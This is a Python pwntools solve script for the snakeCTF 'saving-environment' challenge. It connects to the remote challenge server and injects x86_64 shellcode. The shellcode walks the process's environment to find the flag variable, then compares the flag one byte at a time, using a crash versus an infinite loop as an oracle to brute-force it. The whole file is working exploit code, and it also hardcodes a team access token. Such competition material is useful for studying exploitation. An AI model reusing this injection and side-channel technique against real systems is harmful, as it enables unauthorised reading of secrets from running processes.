from pwn import *
import string
import time

EXE_FILENAME = "./chall"
exe = ELF(EXE_FILENAME)
context.binary = exe
context.arch = "x86_64"

ENVP_OFFSET = 0x30
# FLAG_ENV_OFFSET = 0x108
FLAG_ENV_OFFSET = 0x38
TIMEOUT = 1
TEAM_TOKEN = "673e38e364010957c7973f27f3698eba"

def check_char(index, character):
    return f'''
    mov dl, BYTE PTR [rdi + {index}]
    cmp dl, {ord(character)}
    je loop
    mov rax, 0x0
    mov rax, QWORD PTR [rax]
    loop:
    mov rcx, 0x500000
    jmp loop
    '''

flag = "snakeCTF{"
dic = string.printable

while True:
    for elem in dic:
        # p = gdb.debug([EXE_FILENAME])
        # p = process(EXE_FILENAME)
        p = remote("saving-environment.challs.snakectf.org", 1337, ssl=True)
        p.recvuntil(b"enter your team token: ")
        p.sendline(TEAM_TOKEN.encode())

        guess = flag + elem
        print(f"Guessing: {guess}")
        shellcode = f'''
            mov rbx, QWORD PTR [rbp - {ENVP_OFFSET}]
            mov rax, rbx
            add rax, {FLAG_ENV_OFFSET}
            mov rdi, QWORD PTR [rax]
            add rdi, 5
            
        ''' + check_char(len(flag), elem)

        shellcode = asm(shellcode)
        p.sendline(str(len(shellcode)).encode())
        p.sendline(shellcode)
        res = p.recvuntil(b"Killed... What did you do??", timeout=TIMEOUT)
        if not (b"Killed" in res):
            flag = guess
            break
        p.close()
    if elem == dic[len(dic) - 1]:
        print(f"\n\nFound: {flag}\n\n")
        exit()